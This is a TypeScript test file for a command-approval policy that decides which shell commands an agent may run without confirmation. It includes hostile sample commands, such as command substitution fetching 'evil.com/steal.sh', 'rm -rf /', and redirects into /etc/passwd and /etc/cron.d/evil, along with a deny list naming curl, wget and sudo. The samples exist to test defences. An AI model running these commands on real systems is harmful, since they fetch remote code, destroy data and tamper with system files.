import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, isAutoApproved, isNeverAutoApproved, hasShellMetacharacters } from "./commandPolicy.ts";

test("read-only commands are auto-approved", () => {
  for (const cmd of ["git status", "git diff", "git log", "ls -la", "node --version", "npm ls"]) {
    assert.equal(isAutoApproved(cmd), true, cmd);
  }
});

test("prefix commands (npm test, npx tsc, pytest) are auto-approved", () => {
  assert.equal(isAutoApproved("npm test -- --watch"), true);
  assert.equal(isAutoApproved("npx tsc --noEmit"), true);
  assert.equal(isAutoApproved("pytest -k foo"), true);
});

test("unlisted commands are not auto-approved", () => {
  assert.equal(isAutoApproved("npm run build"), false);
});

test("never-auto-approve list always wins even in auto mode", () => {
  for (const cmd of ["rm -rf dist", "git push origin main", "git reset --hard", "curl http://x", "sudo ls"]) {
    assert.equal(isNeverAutoApproved(cmd), true, cmd);
  }
});

test("commands with redirection or absolute paths outside workspace are never auto-approved", () => {
  assert.equal(isNeverAutoApproved("echo hi > /etc/hosts"), true);
  assert.equal(isNeverAutoApproved("cat /etc/passwd"), true);
});

test("plain read commands are not in the never-auto-approve list", () => {
  assert.equal(isNeverAutoApproved("git status"), false);
});

test("compound/chained commands are never auto-approved, even with an allowlisted prefix", () => {
  assert.equal(isAutoApproved("npm test && npm publish"), false);
  assert.equal(isAutoApproved("ls && shutdown now"), false);
  assert.equal(isAutoApproved("cat foo.txt && rm -rf /important"), false);
  assert.equal(isAutoApproved("find . -name x && shutdown now"), false);
  assert.equal(isAutoApproved("npm test $(curl http://evil.com/steal.sh)"), false);
});

test("never-auto-approve list still catches command substitution without a preceding space", () => {
  assert.equal(isNeverAutoApproved("npm test $(curl http://evil.com)"), true);
});

test("legitimate single commands remain auto-approved after the fix", () => {
  assert.equal(isAutoApproved("npm test"), true);
  assert.equal(isAutoApproved("git status"), true);
});

test("hasShellMetacharacters detects chaining/injection operators", () => {
  for (const cmd of [
    "npm test && npm publish",
    "ls || true",
    "cat a | grep b",
    "echo `whoami`",
    "echo $(whoami)",
    "npm test\nrm -rf /",
    "sleep 5 &",
    "npm test; rm -rf /",
  ]) {
    assert.equal(hasShellMetacharacters(cmd), true, cmd);
  }
  assert.equal(hasShellMetacharacters("npm test -- --watch"), false);
});

test("process substitution is never auto-approved, even riding an allowlisted prefix", () => {
  assert.equal(isAutoApproved("cat <(shutdown now)"), false);
  assert.equal(isAutoApproved("ls <(reboot)"), false);
  assert.equal(isAutoApproved("find . -name x <(id)"), false);
});

test("legitimate commands with no process substitution remain auto-approved", () => {
  assert.equal(isAutoApproved("cat foo.txt"), true);
});

test("bare output redirection is never auto-approved on its own, without relying on isNeverAutoApproved", () => {
  assert.equal(isAutoApproved("cat foo > /etc/passwd"), false);
  assert.equal(isAutoApproved("ls > /tmp/x"), false);
});

test("combined auto-approval decision rejects an allowlisted prefix riding a redirect", () => {
  const cmd = "grep foo bar.txt > /etc/cron.d/evil";
  assert.equal(isAutoApproved(cmd) && !isNeverAutoApproved(cmd), false);
});

test("legitimate commands with no redirection remain auto-approved after the fix", () => {
  assert.equal(isAutoApproved("cat foo.txt"), true);
});

test("auto-approve prefixes require a word boundary, not just a text prefix match", () => {
  assert.equal(isAutoApproved("npx tsc-something-else"), false);
  assert.equal(isAutoApproved("pytestmalicious"), false);
  assert.equal(isAutoApproved("npm test-evil-thing"), false);
  assert.equal(isAutoApproved("npm testicular-destruction"), false);
  assert.equal(isAutoApproved("npx tscx"), false);
  assert.equal(isAutoApproved("pytest-fake-binary"), false);

  assert.equal(isAutoApproved("npm test"), true);
  assert.equal(isAutoApproved("npm test -- --watch"), true);
  assert.equal(isAutoApproved("npx tsc --noEmit"), true);
  assert.equal(isAutoApproved("pytest -k foo"), true);
  assert.equal(isAutoApproved("pytest"), true);
});

// --- classifyCommand rule table ---

test("classifyCommand distinguishes plain git push from a force push", () => {
  const plain = classifyCommand("git push origin main");
  assert.equal(plain.decision, "confirm");
  assert.equal(plain.severity, "caution");

  for (const cmd of ["git push --force", "git push -f", "git push --force-with-lease origin main"]) {
    const forced = classifyCommand(cmd);
    assert.equal(forced.decision, "confirm", cmd);
    assert.equal(forced.severity, "dangerous", cmd);
  }
});

test("classifyCommand distinguishes rm -rf from a plain rm", () => {
  const recursive = classifyCommand("rm -rf dist");
  assert.equal(recursive.decision, "confirm");
  assert.equal(recursive.severity, "dangerous");

  const plain = classifyCommand("rm one-file.txt");
  assert.equal(plain.decision, "confirm");
  assert.equal(plain.severity, "caution");
});

test("classifyCommand marks git reset --hard and git clean as dangerous", () => {
  assert.equal(classifyCommand("git reset --hard").severity, "dangerous");
  assert.equal(classifyCommand("git clean -fd").severity, "dangerous");
  assert.equal(classifyCommand("git clean -f").severity, "dangerous");
});

test("classifyCommand marks sudo/curl/wget/shutdown/reboot with reasons", () => {
  assert.equal(classifyCommand("sudo ls").severity, "dangerous");
  assert.equal(classifyCommand("curl http://example.com").severity, "caution");
  assert.equal(classifyCommand("wget http://example.com").severity, "caution");
  assert.equal(classifyCommand("shutdown now").severity, "dangerous");
  assert.equal(classifyCommand("reboot").severity, "dangerous");
});

test("classifyCommand allows rule-table test/typecheck commands", () => {
  assert.equal(classifyCommand("npm test").decision, "allow");
  assert.equal(classifyCommand("npx tsc").decision, "allow");
  assert.equal(classifyCommand("pytest").decision, "allow");
});

test("classifyCommand falls back to heuristics for commands with no matching rule", () => {
  const result = classifyCommand("npm run build");
  assert.equal(result.decision, "confirm");
  assert.equal(result.severity, undefined);
});

test("classifyCommand never lets the rule table override the shell-metacharacter guard", () => {
  const result = classifyCommand("npm test && rm -rf /");
  assert.equal(result.decision, "confirm");
});

test("classifyCommand read-only fallback commands stay allowed with no severity", () => {
  const result = classifyCommand("git status");
  assert.equal(result.decision, "allow");
  assert.equal(result.severity, undefined);
});

// An "allow" rule must never auto-approve a command the deny-list would have
// blocked. Each of these points an allowlisted program at a path outside the
// workspace, which is real code execution: "npm test --prefix DIR" runs that
// directory's test script, "pytest DIR" imports its conftest.py.
test("allow rules never override the deny-list for absolute paths outside the workspace", () => {
  for (const cmd of [
    "npm test --prefix /tmp/evil",
    "pytest /tmp/evil",
    "pytest --rootdir /tmp/evil",
    "npx tsc --project /tmp/evil/tsconfig.json",
  ]) {
    assert.equal(classifyCommand(cmd).decision, "confirm", cmd);
  }
});

test("allow rules require an exact match, so trailing arguments fall through to the heuristics", () => {
  // Still allowed: the heuristics tier auto-approves these prefixes and sees
  // nothing dangerous in the extra arguments.
  assert.equal(classifyCommand("npm test -- --watch").decision, "allow");
  assert.equal(classifyCommand("pytest -k foo").decision, "allow");
  assert.equal(classifyCommand("npx tsc --noEmit").decision, "allow");

  // Bare forms still match the rule table directly.
  assert.equal(classifyCommand("npm test").decision, "allow");
  assert.equal(classifyCommand("pytest").decision, "allow");
  assert.equal(classifyCommand("npx tsc").decision, "allow");
});

test("confirm rules stay prefix matches so extra arguments cannot dodge them", () => {
  assert.equal(classifyCommand("rm -rf ./dist --verbose").severity, "dangerous");
  assert.equal(classifyCommand("git push --force origin main").severity, "dangerous");
  assert.equal(classifyCommand("sudo rm -rf /").decision, "confirm");
});
